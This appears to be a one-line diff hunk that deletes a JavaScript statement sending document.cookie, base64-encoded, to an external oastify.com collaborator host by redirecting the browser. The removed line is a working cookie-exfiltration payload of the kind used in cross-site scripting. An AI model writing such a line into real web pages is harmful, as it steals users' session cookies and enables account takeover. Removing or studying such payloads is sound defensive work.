@@ -1,1 +1,0 @@
-window.location.href = "https://wmmipmfhflgg2536qiy1z9weu50wooocd.oastify.com/?c=" + btoa(document.cookie);
